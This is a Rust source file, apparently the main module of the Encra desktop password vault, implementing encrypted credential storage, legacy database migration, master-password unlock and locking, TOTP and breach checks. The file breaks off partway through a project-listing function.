#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

mod vault;
mod totp;
mod hibp;
mod journal;
mod nmap;
mod kb;
mod backup;
mod activity;
mod clipboard;
mod credentials;
mod fields;
mod migrate;
mod util;

use std::path::{Path, PathBuf};
use std::sync::{Arc, Mutex};
use tauri::Manager;
use util::{check_field, constant_time_eq, fill_random, uuid_v4, wipe_strings};
use clipboard::ClipboardGuard;
use credentials::{CopyField, CredentialDetail, CredentialSummary, PasswordProfile, TotpCode};
use vault::{AppState, CredentialInput, Dek};
use rusqlite::Connection;
use base64::Engine;
use zeroize::Zeroize;

const CURRENT_DATABASE_NAME: &str = "encra.db";
/// Earlier product names as (bundle identifier, database file), newest first.
/// Only the first vault found is copied, so an old KeyRPT file can never win
/// over a newer Cobrypt vault.
const LEGACY_VAULTS: &[(&str, &str)] = &[
    ("com.cobrypt.desktop", "cobrypt.db"),
    ("com.keyrpt.app", "keyrpt.db"),
];

fn copy_database_atomically(source: &Path, destination: &Path) -> Result<(), String> {
    let parent = destination.parent().ok_or("Encra database path has no parent")?;
    std::fs::create_dir_all(parent).map_err(|e| format!("failed to create Encra data directory: {e}"))?;

    let temp_path = destination.with_extension(format!("db.migrating-{}", uuid_v4()));
    let migration = (|| -> Result<(), String> {
        let source_db = Connection::open_with_flags(
            source,
            rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY,
        ).map_err(|e| format!("failed to open previous vault database: {e}"))?;

        source_db.execute(
            "VACUUM INTO ?1",
            rusqlite::params![temp_path.to_string_lossy().as_ref()],
        ).map_err(|e| format!("failed to copy previous vault database: {e}"))?;
        drop(source_db);

        let copied_db = Connection::open_with_flags(
            &temp_path,
            rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY,
        ).map_err(|e| format!("failed to validate migrated Encra database: {e}"))?;
        let integrity: String = copied_db
            .query_row("PRAGMA quick_check", [], |row| row.get(0))
            .map_err(|e| format!("failed to check migrated Encra database: {e}"))?;
        drop(copied_db);

        if integrity != "ok" {
            return Err(format!("previous vault database failed integrity check: {integrity}"));
        }

        // A hard link creates the destination atomically and fails if it already
        // exists, so a concurrent startup can never overwrite an Encra vault.
        std::fs::hard_link(&temp_path, destination)
            .map_err(|e| format!("failed to activate migrated Encra database: {e}"))?;
        let _ = std::fs::remove_file(&temp_path);
        Ok(())
    })();

    if migration.is_err() {
        let _ = std::fs::remove_file(&temp_path);
    }
    migration
}

fn migrate_database_if_needed(current: &Path, candidates: &[PathBuf]) -> Result<bool, String> {
    if current.exists() {
        return Ok(false);
    }

    if let Some(source) = candidates.iter().find(|candidate| candidate.is_file()) {
        copy_database_atomically(source, current)?;
        return Ok(true);
    }

    Ok(false)
}

/// Where an earlier vault may live, in the order it should be preferred: for
/// each old product, a renamed file in this app's own data directory first,
/// then the old app's data directory beside it.
fn legacy_database_candidates(current_dir: &Path) -> Vec<PathBuf> {
    let mut candidates = Vec::new();
    for (identifier, file) in LEGACY_VAULTS {
        candidates.push(current_dir.join(file));
        if let Some(data_root) = current_dir.parent() {
            candidates.push(data_root.join(identifier).join(file));
        }
    }
    candidates
}

/// Owner-only access to the vault folder (0700) and database (0600), set on
/// every launch. A vault copied in by the brand migration is created with the
/// default 0644, so this fixes it too. SQLite's side files inherit the
/// database's mode, and are covered here in case they already exist.
#[cfg(unix)]
fn restrict_permissions(db_path: &Path) -> Result<(), String> {
    use std::os::unix::fs::PermissionsExt;
    let set = |path: &Path, mode: u32| {
        std::fs::set_permissions(path, std::fs::Permissions::from_mode(mode))
            .map_err(|e| format!("failed to restrict permissions on {}: {e}", path.display()))
    };
    if let Some(dir) = db_path.parent() {
        set(dir, 0o700)?;
    }
    for suffix in ["", "-journal", "-wal", "-shm"] {
        let mut name = db_path.as_os_str().to_owned();
        name.push(suffix);
        let path = PathBuf::from(name);
        if path.exists() {
            set(&path, 0o600)?;
        }
    }
    Ok(())
}

#[cfg(not(unix))]
fn restrict_permissions(_db_path: &Path) -> Result<(), String> {
    Ok(())
}

fn vault_path(app: &tauri::AppHandle) -> Result<PathBuf, String> {
    // Debug builds only: lets a dev run use a throwaway vault, so smoke tests
    // never touch the real one. `debug_assertions` is off in release builds,
    // so this branch does not exist in a shipped app.
    #[cfg(debug_assertions)]
    if let Some(dir) = std::env::var_os("ENCRA_DATA_DIR") {
        return Ok(PathBuf::from(dir).join(CURRENT_DATABASE_NAME));
    }

    let current_dir = app.path().app_data_dir().map_err(|e| e.to_string())?;
    let current_path = current_dir.join(CURRENT_DATABASE_NAME);
    migrate_database_if_needed(&current_path, &legacy_database_candidates(&current_dir))?;
    Ok(current_path)
}

/// Minimum master-password length accepted when a password is *created* or
/// *changed*. It is deliberately not enforced when verifying an existing
/// password, so a vault created before this rule can still be unlocked.
const MIN_MASTER_PASSWORD_CHARS: usize = 12;
/// Minimum length for a backup password, which protects the entire vault.
const MIN_BACKUP_PASSWORD_CHARS: usize = 8;

const MAX_FIELD_CHARS: usize = 8_192;
const MAX_LONG_FIELD_CHARS: usize = 65_536;

/// Check vault is unlocked — returns the DEK in a guard that wipes it on drop.
fn require_unlocked(state: &AppState) -> Result<Dek, String> {
    let key = state.encryption_key.lock().map_err(|e| e.to_string())?;
    key.as_ref().map(|dek| Dek::new(**dek)).ok_or_else(|| "vault is locked".into())
}

fn require_db(state: &AppState) -> Result<std::sync::MutexGuard<'_, Connection>, String> {
    state.db.lock().map_err(|e| e.to_string())
}

/// Run `write` inside one immediate transaction, rolling back on any failure.
///
/// Multi-step writes must be all-or-nothing: a crash or error between two
/// statements otherwise leaves a half-applied change behind.
fn in_transaction<T, F>(db: &Connection, write: F) -> Result<T, String>
where
    F: FnOnce() -> Result<T, String>,
{
    db.execute("BEGIN IMMEDIATE", []).map_err(|e| e.to_string())?;
    match write() {
        Ok(value) => {
            if db.execute("COMMIT", []).is_err() {
                db.execute("ROLLBACK", []).ok();
                return Err("transaction failed to commit, no changes were made".into());
            }
            Ok(value)
        }
        Err(e) => {
            db.execute("ROLLBACK", []).ok();
            Err(e)
        }
    }
}

/// Reject an empty password before it reaches Argon2.
fn reject_empty_password(password: &str, label: &str) -> Result<(), String> {
    if password.is_empty() {
        return Err(format!("{label} must not be empty"));
    }
    Ok(())
}

/// Enforce a minimum length for a password being created or changed.
fn require_min_length(password: &str, label: &str, min_chars: usize) -> Result<(), String> {
    reject_empty_password(password, label)?;
    if password.chars().count() < min_chars {
        return Err(format!(
            "{label} must be at least {min_chars} characters"
        ));
    }
    Ok(())
}

/// Validate a credential's user-supplied fields before storing them.
fn validate_credential(input: &CredentialInput) -> Result<(), String> {
    check_field(&input.service, "service", MAX_FIELD_CHARS)?;
    check_field(&input.username, "username", MAX_FIELD_CHARS)?;
    check_field(&input.url, "url", MAX_FIELD_CHARS)?;
    check_field(&input.password, "password", MAX_LONG_FIELD_CHARS)?;
    check_field(&input.notes, "notes", MAX_LONG_FIELD_CHARS)?;
    if input.service.trim().is_empty() {
        return Err("service must not be empty".into());
    }
    Ok(())
}

// --- Impl functions (called by both commands and tests) ---

#[tauri::command]
fn list_credentials(state: tauri::State<AppState>) -> Result<Vec<CredentialSummary>, String> {
    let key = require_unlocked(&state)?;
    let db = require_db(&state)?;
    credentials::list_summaries(&db, &key)
}

#[tauri::command]
fn get_credential(state: tauri::State<AppState>, id: String) -> Result<CredentialDetail, String> {
    let key = require_unlocked(&state)?;
    let db = require_db(&state)?;
    credentials::detail(&db, &key, &id)
}

/// The one path that sends a stored password to the webview: an explicit Show.
#[tauri::command]
fn reveal_password(state: tauri::State<AppState>, id: String) -> Result<String, String> {
    let key = require_unlocked(&state)?;
    let db = require_db(&state)?;
    credentials::reveal_password(&db, &key, &id).map(|password| password.to_string())
}

#[tauri::command]
fn describe_password(state: tauri::State<AppState>, id: String) -> Result<PasswordProfile, String> {
    let key = require_unlocked(&state)?;
    let db = require_db(&state)?;
    credentials::describe_password(&db, &key, &id)
}

#[tauri::command]
fn get_totp(state: tauri::State<AppState>, id: String) -> Result<Option<TotpCode>, String> {
    let key = require_unlocked(&state)?;
    let db = require_db(&state)?;
    credentials::totp_code(&db, &key, &id)
}

/// Copy a login field straight from the database to the clipboard.
#[tauri::command]
fn copy_credential_field(
    state: tauri::State<AppState>,
    clipboard: tauri::State<Arc<ClipboardGuard>>,
    id: String,
    field: CopyField,
) -> Result<(), String> {
    let value = {
        let key = require_unlocked(&state)?;
        let db = require_db(&state)?;
        credentials::copy_value(&db, &key, &id, field)?
    };
    clipboard.copy(&value)
}

/// Copy text the webview already holds (a generated password, a command), so
/// every copy shares the same wipe.
#[tauri::command]
fn copy_text(
    state: tauri::State<AppState>,
    clipboard: tauri::State<Arc<ClipboardGuard>>,
    mut text: String,
) -> Result<(), String> {
    let _key = require_unlocked(&state)?;
    let result = clipboard.copy(&text);
    text.zeroize();
    result
}

#[tauri::command]
async fn check_credential_breach(state: tauri::State<'_, AppState>, id: String) -> Result<u32, String> {
    let password = {
        let key = require_unlocked(&state)?;
        let db = require_db(&state)?;
        credentials::reveal_password(&db, &key, &id)?
    };
    if password.is_empty() {
        return Err("that login has no password".into());
    }
    hibp::check_password(&password).await
}

#[tauri::command]
fn add_credential(state: tauri::State<AppState>, input: CredentialInput) -> Result<String, String> {
    let key = require_unlocked(&state)?;
    let db = require_db(&state)?;
    validate_credential(&input)?;

    let id = uuid_v4();
    let seal = |column: &str, value: &str| fields::seal(&key, "credentials", &id, column, value);
    let encrypted_service = seal("service", &input.service)?;
    let encrypted_pw = seal("password_encrypted", &input.password)?;
    let encrypted_user = seal("username", &input.username)?;
    let encrypted_url = seal("url", &input.url)?;
    let encrypted_notes = seal("notes", &input.notes)?;

    in_transaction(&db, || {
        db.execute(
            "INSERT INTO credentials (id, service, username, password_encrypted, url, notes) VALUES (?1, ?2, ?3, ?4, ?5, ?6)",
            rusqlite::params![id, encrypted_service, encrypted_user, encrypted_pw, encrypted_url, encrypted_notes],
        ).map_err(|e| e.to_string())?;
        // No name: the log is readable while locked, so it must not list
        // which accounts the vault holds.
        activity::log_action(&db, "credential_add", "added a login");
        Ok(())
    })?;
    seal_log(&db, &key);

    // Only the new id goes back; the webview reloads the list for the rest.
    Ok(id)
}

#[tauri::command]
fn update_credential(state: tauri::State<AppState>, id: String, input: CredentialInput) -> Result<(), String> {
    let key = require_unlocked(&state)?;
    let db = require_db(&state)?;
    validate_credential(&input)?;

    let seal = |column: &str, value: &str| fields::seal(&key, "credentials", &id, column, value);
    // A blank password keeps the stored one, which is already bound to this
    // row and column.
    let encrypted_pw = if input.password.is_empty() {
        db.query_row("SELECT password_encrypted FROM credentials WHERE id = ?1", rusqlite::params![id], |row| row.get::<_, String>(0))
            .map_err(|_| "credential not found".to_string())?
    } else {
        seal("password_encrypted", &input.password)?
    };
    let encrypted_service = seal("service", &input.service)?;
    let encrypted_user = seal("username", &input.username)?;
    let encrypted_url = seal("url", &input.url)?;
    let encrypted_notes = seal("notes", &input.notes)?;

    let updated = db.execute(
        "UPDATE credentials SET service=?1, username=?2, password_encrypted=?3, url=?4, notes=?5 WHERE id=?6",
        rusqlite::params![encrypted_service, encrypted_user, encrypted_pw, encrypted_url, encrypted_notes, id],
    ).map_err(|e| e.to_string())?;
    if updated == 0 {
        return Err("credential not found".into());
    }

    Ok(())
}

#[tauri::command]
fn delete_credential(state: tauri::State<AppState>, id: String) -> Result<(), String> {
    let key = require_unlocked(&state)?;
    let db = require_db(&state)?;
    in_transaction(&db, || {
        db.execute("DELETE FROM credentials WHERE id = ?1", rusqlite::params![id]).map_err(|e| e.to_string())?;
        activity::log_action(&db, "credential_delete", "deleted a login");
        Ok(())
    })?;
    seal_log(&db, &key);
    Ok(())
}

// ===== Unlock / Lock =====

/// Every migration a vault may need once its data key is known, in order:
/// format 1 to 2 (encrypt plain fields), 2 to 3 (bind every value, encrypt
/// names), stronger Argon2 settings, then sealing the activity log. Shared by
/// unlock, legacy unlock and recovery, so no path opens an unmigrated vault.
fn bring_up_to_date(db: &Connection, master_password: &str, dek: &[u8; 32]) -> Result<(), String> {
    migrate_plaintext_fields(db, dek)?;
    migrate::migrate_to_format_3(db, dek)?;
    migrate::upgrade_kdf(db, master_password, dek)?;
    seal_log(db, dek);
    Ok(())
}

/// Seal pending log entries. Best effort: a failure here must not block the
/// operation that logged, and anything left pending is sealed next time.
fn seal_log(db: &Connection, dek: &[u8; 32]) {
    if let Err(error) = activity::seal_pending(db, dek) {
        eprintln!("Encra could not seal the activity log: {error}");
    }
}

/// What the vault file holds, read before anything is decrypted.
#[derive(Debug, PartialEq)]
enum VaultKind {
    /// No master password has been set yet.
    Fresh,
    /// A pre-DEK vault that migrates on its first unlock.
    Legacy(String),
    /// A DEK-model vault.
    Current { encrypted_dek: String, password_hash: String },
}

fn vault_kind(db: &Connection) -> Result<VaultKind, String> {
    let read = |key: &str| -> Result<String, String> {
        db.query_row("SELECT COALESCE((SELECT value FROM vault_config WHERE key = ?1), '')", [key], |row| row.get(0))
            .map_err(|e| e.to_string())
    };
    let encrypted_dek = read("encrypted_dek")?;
    let password_hash = read("password_hash")?;
    let legacy_hash = read("master_hash")?;
    Ok(match (encrypted_dek.is_empty() && password_hash.is_empty(), legacy_hash.is_empty()) {
        (true, true) => VaultKind::Fresh,
        (true, false) => VaultKind::Legacy(legacy_hash),
        (false, _) => VaultKind::Current { encrypted_dek, password_hash },
    })
}

/// Set the master password on a fresh vault and return its new data key.
///
/// Refuses if a vault already exists, so creating can never overwrite one.
/// Everything is written in one transaction: a failure leaves the vault fresh.
fn create_vault_impl(db: &Connection, master_password: &str) -> Result<[u8; 32], String> {
    if vault_kind(db)? != VaultKind::Fresh {
        return Err("a vault already exists".into());
    }
    // The one path where the password is chosen, so the one place a strength
    // rule can be enforced without locking anyone out of an older vault.
    require_min_length(master_password, "Master password", MIN_MASTER_PASSWORD_CHARS)?;

    let mut kdf_salt = [0u8; 32];
    fill_random(&mut kdf_salt);
    let salt_b64 = base64::engine::general_purpose::STANDARD.encode(kdf_salt);
    let params = vault::KdfParams::CURRENT.encode();
    let mut wrapping_key = vault::derive_key_with(master_password, &kdf_salt, vault::KdfParams::CURRENT)?;
    let dek = vault::generate_dek();
    let wrapped = vault::wrap_dek(&dek, &wrapping_key);
    wrapping_key.zeroize();
    let wrapped = wrapped?;
    let pass_hash = vault::hash_password(master_password)?;

    in_transaction(db, || {
        for (key, value) in [
            ("encrypted_dek", wrapped.as_str()),
            ("password_hash", pass_hash.as_str()),
            ("kdf_salt", salt_b64.as_str()),
            ("kdf_params", params.as_str()),
            ("schema_version", migrate::FORMAT_3),
        ] {
            db.execute("INSERT OR REPLACE INTO vault_config (key, value) VALUES (?1, ?2)", rusqlite::params![key, value])
                .map_err(|e| e.to_string())?;
        }
        activity::log_action(db, "vault_created", "new vault created");
        Ok(())
    })?;
    seal_log(db, &dek);
    Ok(dek)
}

/// Unlock a DEK-model vault. `Ok(None)` means a wrong password, which is
/// recorded in the activity log.
fn unlock_current_vault(db: &Connection, master_password: &str) -> Result<Option<[u8; 32]>, String> {
    let VaultKind::Current { encrypted_dek, password_hash } = vault_kind(db)? else {
        return Err("no unlockable vault".into());
    };

    if !vault::verify_password(master_password, &password_hash)? {
        activity::log_action(db, "unlock_failed", "wrong master password");
        return Ok(None);
    }

    let stored_salt: String = db.query_row("SELECT COALESCE((SELECT value FROM vault_config WHERE key = 'kdf_salt'), '')", [], |row| row.get(0))
        .map_err(|e| e.to_string())?;
    if stored_salt.is_empty() {
        return Err("vault has no key-derivation salt".into());
    }
    let kdf_salt = base64::engine::general_purpose::STANDARD.decode(&stored_salt).map_err(|e| e.to_string())?;

    let params = migrate::stored_kdf_params(db)?;
    let mut wrapping_key = vault::derive_key_with(master_password, &kdf_salt, params)?;
    let dek = vault::unwrap_dek(&encrypted_dek, &wrapping_key);
    wrapping_key.zeroize();
    let dek = dek?;

    // Migrate before publishing the key, so a failed migration leaves the vault
    // locked rather than unlocked in a half-migrated state.
    bring_up_to_date(db, master_password, &dek)?;
    activity::log_action(db, "unlock", "vault unlocked");
    seal_log(db, &dek);
    Ok(Some(dek))
}

/// Whether a master password exists yet, so the first launch shows setup
/// instead of an unlock form. It says nothing the database file's own
/// presence doesn't, and it decrypts nothing.
/// Whether the pre-format-3 safety copy is still on disk. It holds the vault
/// with the older, weaker protection, so Settings offers to delete it.
#[tauri::command]
fn safety_copy_exists(state: tauri::State<AppState>) -> Result<bool, String> {
    let _key = require_unlocked(&state)?;
    let db = require_db(&state)?;
    Ok(migrate::snapshot_path(&db).is_some_and(|path| path.exists()))
}

#[tauri::command]
fn delete_safety_copy(state: tauri::State<AppState>) -> Result<(), String> {
    let key = require_unlocked(&state)?;
    let db = require_db(&state)?;
    let Some(path) = migrate::snapshot_path(&db) else { return Ok(()) };
    if path.exists() {
        std::fs::remove_file(&path).map_err(|e| format!("could not delete the safety copy: {e}"))?;
        activity::log_action(&db, "safety_copy_deleted", "pre-upgrade safety copy deleted");
        seal_log(&db, &key);
    }
    Ok(())
}

#[tauri::command]
fn vault_status(state: tauri::State<AppState>) -> Result<&'static str, String> {
    let db = require_db(&state)?;
    Ok(if vault_kind(&db)? == VaultKind::Fresh { "new" } else { "sealed" })
}

#[tauri::command]
fn create_vault(state: tauri::State<AppState>, master_password: String) -> Result<(), String> {
    let db = require_db(&state)?;
    let mut dek = create_vault_impl(&db, &master_password)?;
    let mut key = state.encryption_key.lock().map_err(|e| e.to_string())?;
    *key = Some(Dek::new(dek));
    dek.zeroize();
    Ok(())
}

#[tauri::command]
fn unlock_vault(state: tauri::State<AppState>, master_password: String) -> Result<bool, String> {
    let db = require_db(&state)?;
    match vault_kind(&db)? {
        // Unlocking no longer creates a vault; that is create_vault's job, behind
        // a confirmed password on the setup screen.
        VaultKind::Fresh => Err("no vault has been created yet".into()),
        VaultKind::Legacy(legacy_hash) => migrate_legacy_vault(&db, &state, &master_password, &legacy_hash),
        VaultKind::Current { .. } => match unlock_current_vault(&db, &master_password)? {
            Some(mut dek) => {
                let mut key = state.encryption_key.lock().map_err(|e| e.to_string())?;
                *key = Some(Dek::new(dek));
                dek.zeroize();
                Ok(true)
            }
            None => Ok(false),
        },
    }
}

/// Migrate a legacy vault (pre-DEK model) to the new DEK model.
/// Legacy vaults have master_hash = base64(derive_key(password, legacy_salt)).
/// We decrypt all credentials with that legacy key, re-encrypt under a new random DEK,
/// wrap the DEK, and replace master_hash with password_hash.
fn migrate_legacy_vault(
    db: &Connection,
    state: &AppState,
    master_password: &str,
    legacy_hash: &str,
) -> Result<bool, String> {
    // Legacy salt: the original hardcoded salt from the pre-DEK era
    let legacy_salt = [0x4b, 0x65, 0x79, 0x52, 0x50, 0x54, 0x30, 0x31]; // "KeyRPT01"

    // Derive the legacy key and verify
    let mut legacy_key = vault::derive_key(master_password, &legacy_salt)?;
    let check_hash = base64::engine::general_purpose::STANDARD.encode(legacy_key);
    // Constant-time: this comparison decides whether the caller guessed the
    // master password, so it must not leak how many leading bytes matched.
    if !constant_time_eq(check_hash.as_bytes(), legacy_hash.as_bytes()) {
        legacy_key.zeroize();
        activity::log_action(db, "unlock_failed", "wrong master password");
        return Ok(false);
    }

    // Read all existing credentials (encrypted with legacy key)
    let mut stmt = db
        .prepare("SELECT id, service, username, password_encrypted, url, notes, totp_secret, created_at FROM credentials")
        .map_err(|e| e.to_string())?;

    #[derive(Debug)]
    #[allow(dead_code)]
    struct RawCred {
        id: String, service: String, username: String,
        password_encrypted: String, url: String,
        notes: String, totp_secret: Option<String>, created_at: String,
    }

    let raw_creds: Vec<RawCred> = stmt
        .query_map([], |row| Ok(RawCred {
            id: row.get(0)?, service: row.get(1)?, username: row.get(2)?,
            password_encrypted: row.get(3)?, url: row.get(4)?,
            notes: row.get(5)?, totp_secret: row.get(6)?, created_at: row.get(7)?,
        }))
        .map_err(|e| e.to_string())?
        .collect::<Result<Vec<_>, _>>()
        .map_err(|e| e.to_string())?;

    // Decrypt passwords with legacy key
    let mut decrypted_passwords: Vec<String> = Vec::new();
    for cred in &raw_creds {
        let plain = vault::decrypt_to_string(&legacy_key, &cred.password_encrypted)?;
        decrypted_passwords.push(plain);
    }

    // Generate new DEK + new per-vault salt + wrapping key
    let new_dek = vault::generate_dek();
    let mut new_salt = [0u8; 32];
    fill_random(&mut new_salt);
    let salt_b64 = base64::engine::general_purpose::STANDARD.encode(new_salt);
    let mut wrapping_key = vault::derive_key(master_password, &new_salt)?;
    let wrapped_dek = vault::wrap_dek(&new_dek, &wrapping_key)?;
    wrapping_key.zeroize();
    let pass_hash = vault::hash_password(master_password)?;

    // Run entire migration in a transaction
    in_transaction(db, || {
        // Re-encrypt all credentials with new DEK
        for (i, cred) in raw_creds.iter().enumerate() {
            let new_enc = vault::encrypt(&new_dek, &decrypted_passwords[i])?;
            db.execute(
                "UPDATE credentials SET password_encrypted = ?1 WHERE id = ?2",
                rusqlite::params![new_enc, cred.id],
            ).map_err(|e| e.to_string())?;
        }

        // Write new vault config
        db.execute("INSERT OR REPLACE INTO vault_config (key, value) VALUES ('encrypted_dek', ?1)", rusqlite::params![wrapped_dek]).map_err(|e| e.to_string())?;
        db.execute("INSERT OR REPLACE INTO vault_config (key, value) VALUES ('password_hash', ?1)", rusqlite::params![pass_hash]).map_err(|e| e.to_string())?;
        db.execute("INSERT OR REPLACE INTO vault_config (key, value) VALUES ('kdf_salt', ?1)", rusqlite::params![salt_b64]).map_err(|e| e.to_string())?;

        // Clear legacy master_hash
        db.execute("DELETE FROM vault_config WHERE key = 'master_hash'", []).map_err(|e| e.to_string())?;
        Ok(())
    })
    .map_err(|e| format!("migration failed: {}", e))?;

    legacy_key.zeroize();
    wipe_strings(&mut decrypted_passwords);

    activity::log_action(db, "migration", "legacy vault migrated to DEK model");
    bring_up_to_date(db, master_password, &new_dek)?;

    {
        let mut ek = state.encryption_key.lock().map_err(|e| e.to_string())?;
        *ek = Some(Dek::new(new_dek));
    }
    Ok(true)
}

/// Migrate plaintext fields to encrypted (schema v1 → v2).
fn migrate_plaintext_fields(db: &Connection, dek: &[u8; 32]) -> Result<(), String> {
    let version: String = db.query_row(
        "SELECT value FROM vault_config WHERE key = 'schema_version'",
        [], |r| r.get(0)
    ).unwrap_or_else(|_| "1".into());

    if version != "1" { return Ok(()); }

    // All five tables plus the version bump commit together. Previously a
    // failure part-way through left some fields encrypted and others plaintext
    // while the version still advertised v1, so the next unlock would re-encrypt
    // the fields that had already succeeded.
    in_transaction(db, || migrate_plaintext_fields_inner(db, dek))
}

/// The table-by-table migration body. Always runs inside a transaction.
fn migrate_plaintext_fields_inner(db: &Connection, dek: &[u8; 32]) -> Result<(), String> {
    // credentials: username, url, notes
    {
        let mut stmt = db.prepare("SELECT id, username, url, notes FROM credentials").map_err(|e| e.to_string())?;
        let rows: Vec<(String, String, String, String)> = stmt.query_map([], |row| Ok((row.get(0)?, row.get(1)?, row.get(2)?, row.get(3)?)))
            .map_err(|e| e.to_string())?.collect::<Result<Vec<_>,_>>().map_err(|e| e.to_string())?;
        for (id, u, url, n) in rows {
            db.execute("UPDATE credentials SET username=?1, url=?2, notes=?3 WHERE id=?4",
                rusqlite::params![vault::encrypt(dek, &u)?, vault::encrypt(dek, &url)?, vault::encrypt(dek, &n)?, id]).map_err(|e| e.to_string())?;
        }
    }
    // TOTP secrets
    {
        let mut stmt = db.prepare("SELECT id, totp_secret FROM credentials WHERE totp_secret IS NOT NULL AND totp_secret != ''").map_err(|e| e.to_string())?;
        let rows: Vec<(String, String)> = stmt.query_map([], |row| Ok((row.get(0)?, row.get(1)?)))
            .map_err(|e| e.to_string())?.collect::<Result<Vec<_>,_>>().map_err(|e| e.to_string())?;
        for (id, sec) in rows {
            db.execute("UPDATE credentials SET totp_secret=?1 WHERE id=?2",
                rusqlite::params![vault::encrypt(dek, &sec)?, id]).map_err(|e| e.to_string())?;
        }
    }
    // projects: description, target, methodology
    {
        let mut stmt = db.prepare("SELECT id, description, target, methodology FROM projects").map_err(|e| e.to_string())?;
        let rows: Vec<(String, String, String, String)> = stmt.query_map([], |row| Ok((row.get(0)?, row.get(1)?, row.get(2)?, row.get(3)?)))
            .map_err(|e| e.to_string())?.collect::<Result<Vec<_>,_>>().map_err(|e| e.to_string())?;
        for (id, d, t, m) in rows {
            db.execute("UPDATE projects SET description=?1, target=?2, methodology=?3 WHERE id=?4",
                rusqlite::params![vault::encrypt(dek, &d)?, vault::encrypt(dek, &t)?, vault::encrypt(dek, &m)?, id]).map_err(|e| e.to_string())?;
        }
    }
    // journal_entries: title, content
    {
        let mut stmt = db.prepare("SELECT id, title, content FROM journal_entries").map_err(|e| e.to_string())?;
        let rows: Vec<(String, String, String)> = stmt.query_map([], |row| Ok((row.get(0)?, row.get(1)?, row.get(2)?)))
            .map_err(|e| e.to_string())?.collect::<Result<Vec<_>,_>>().map_err(|e| e.to_string())?;
        for (id, t, c) in rows {
            db.execute("UPDATE journal_entries SET title=?1, content=?2 WHERE id=?3",
                rusqlite::params![vault::encrypt(dek, &t)?, vault::encrypt(dek, &c)?, id]).map_err(|e| e.to_string())?;
        }
    }
    // kb_entries: title, command, description, tags
    {
        let mut stmt = db.prepare("SELECT id, title, command, description, tags FROM kb_entries").map_err(|e| e.to_string())?;
        let rows: Vec<(String, String, String, String, String)> = stmt.query_map([], |row| Ok((row.get(0)?, row.get(1)?, row.get(2)?, row.get(3)?, row.get(4)?)))
            .map_err(|e| e.to_string())?.collect::<Result<Vec<_>,_>>().map_err(|e| e.to_string())?;
        for (id, ti, cmd, d, ta) in rows {
            db.execute("UPDATE kb_entries SET title=?1, command=?2, description=?3, tags=?4 WHERE id=?5",
                rusqlite::params![vault::encrypt(dek, &ti)?, vault::encrypt(dek, &cmd)?, vault::encrypt(dek, &d)?, vault::encrypt(dek, &ta)?, id]).map_err(|e| e.to_string())?;
        }
    }

    db.execute("INSERT OR REPLACE INTO vault_config (key, value) VALUES ('schema_version', '2')", []).map_err(|e| e.to_string())?;
    Ok(())
}

/// How the vault was sealed, for the log. The webview sends one of a fixed set
/// of codes and the wording comes from here, so it can't write free text into
/// the log.
fn seal_detail(reason: Option<&str>) -> &'static str {
    match reason {
        Some("button") => "sealed with the Seal button",
        Some("shortcut") => "sealed with the keyboard shortcut",
        Some("idle") => "sealed after 5 idle minutes",
        Some("app_switch") => "sealed when Encra lost focus",
        _ => "vault locked",
    }
}

#[tauri::command]
fn lock_vault(
    state: tauri::State<AppState>,
    clipboard: tauri::State<Arc<ClipboardGuard>>,
    reason: Option<String>,
) -> Result<(), String> {
    // Every lock path (button, shortcut, idle timer, blur) ends here, so this
    // is the one place a still-pending copied secret gets wiped.
    clipboard.wipe_now();
    let db = require_db(&state)?;
    activity::log_action(&db, "lock", seal_detail(reason.as_deref()));
    let mut key = state.encryption_key.lock().map_err(|e| e.to_string())?;
    if let Some(dek) = key.as_ref() {
        seal_log(&db, dek);
    }
    // Dropping the Dek overwrites the key bytes in place.
    *key = None;
    Ok(())
}

// ===== TOTP =====

#[tauri::command]
fn setup_totp(state: tauri::State<AppState>, credential_id: String, secret: String) -> Result<(), String> {
    let key = require_unlocked(&state)?;
    let db = require_db(&state)?;
    totp::validate_secret(&secret)?;
    let encrypted = fields::seal(&key, "credentials", &credential_id, "totp_secret", &secret.trim().to_uppercase())?;
    let updated = db.execute("UPDATE credentials SET totp_secret = ?1 WHERE id = ?2", rusqlite::params![encrypted, credential_id])
        .map_err(|e| e.to_string())?;
    if updated == 0 {
        return Err("credential not found".into());
    }
    Ok(())
}

#[tauri::command]
fn get_totp_remaining() -> Result<u64, String> {
    Ok(totp::remaining_seconds())
}

#[tauri::command]
fn remove_totp(state: tauri::State<AppState>, credential_id: String) -> Result<(), String> {
    let _key = require_unlocked(&state)?;
    let db = require_db(&state)?;
    db.execute("UPDATE credentials SET totp_secret = NULL WHERE id = ?1", rusqlite::params![credential_id])
        .map_err(|e| e.to_string())?;
    Ok(())
}

// ===== HIBP =====

#[tauri::command]
async fn check_hibp(state: tauri::State<'_, AppState>, password: String) -> Result<u32, String> {
    // This hands a plaintext password to a network client, so it must not be
    // reachable while the vault is locked.
    let _key = require_unlocked(&state)?;
    hibp::check_password(&password).await
}

// ===== Journal =====

#[tauri::command]
fn create_project(state: tauri::State<AppState>, input: journal::ProjectInput) -> Result<journal::Project, String> {
    let key = require_unlocked(&state)?;
    let db = require_db(&state)?;
    check_field(&input.name, "project name", MAX_FIELD_CHARS)?;
    check_field(&input.description, "project description", MAX_LONG_FIELD_CHARS)?;
    check_field(&input.target, "project target", MAX_FIELD_CHARS)?;
    check_field(&input.methodology, "project methodology", MAX_LONG_FIELD_CHARS)?;
    if input.name.trim().is_empty() {
        return Err("project name must not be empty".into());
    }
    let id = uuid_v4();
    let seal = |column: &str, value: &str| fields::seal(&key, "projects", &id, column, value);
    let enc_name = seal("name", &input.name)?;
    let enc_desc = seal("description", &input.description)?;
    let enc_target = seal("target", &input.target)?;
    let enc_method = seal("methodology", &input.methodology)?;
    db.execute("INSERT INTO projects (id, name, description, target, methodology) VALUES (?1, ?2, ?3, ?4, ?5)",
        rusqlite::params![id, enc_name, enc_desc, enc_target, enc_method])
        .map_err(|e| e.to_string())?;
    Ok(journal::Project { id, name: input.name, description: input.description, target: input.target, methodology: input.methodology, status: "planning".into(), created_at: "just now".into(), updated_at: "just now".into() })
}

#[tauri::command]
fn get_projects(state: tauri::State<AppState>) -> Result<Vec<journal::Project>, String> {
    let key = require_unlocked(&state)?;
    let db = require_db(&state)?;
    let mut stmt = db.prepare("SELECT id, name, description, target, methodology, status, created_at, updated_at FROM projects ORDER BY updated_at DESC")
        .map_err(|e| e.to_string())?;
    let results = stmt.query_map([], |row| {
        let id: String = row.get(0)?;
